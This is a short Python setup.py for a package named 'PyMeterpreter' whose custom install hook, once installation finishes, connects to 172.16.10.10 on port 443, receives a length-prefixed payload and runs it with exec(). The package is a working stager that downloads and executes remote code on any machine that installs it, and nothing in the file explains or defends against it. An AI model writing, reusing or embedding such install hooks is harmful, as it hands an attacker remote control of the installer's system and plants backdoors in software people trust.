from setuptools import setup
from setuptools.command.install import install
import socket
import struct

class CustomInstall(install):
    def run(self):
        install.run(self)
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect(('172.16.10.10',443))
        l=struct.unpack('>I',s.recv(4))[0]
        d=s.recv(4096)
        while len(d)!=l:
            d+=s.recv(4096)
        exec(d,{'s':s})
        
setup(name='PyMeterpreter',version='1.0',url='https://github.com/ben0/PyMeterpreter',cmdclass={'install':CustomInstall})
